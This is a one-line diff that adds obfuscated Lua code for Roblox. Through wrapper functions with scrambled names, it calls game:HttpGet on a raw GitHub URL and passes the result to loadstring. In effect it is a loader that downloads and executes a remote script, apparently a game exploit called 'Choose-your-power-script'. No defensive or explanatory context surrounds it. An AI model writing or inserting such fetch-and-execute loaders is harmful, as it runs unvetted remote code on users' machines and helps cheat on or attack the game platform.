@@ -1,0 +1,1 @@
+zqbhirutCALL((zqbhirutCALL((loadstring),zqbhirutNAMECALL(game,"HttpGet","https://raw.githubusercontent.com/DeVerGoose/Choose-your-power-script/refs/heads/main/CYS-DeVer"))));
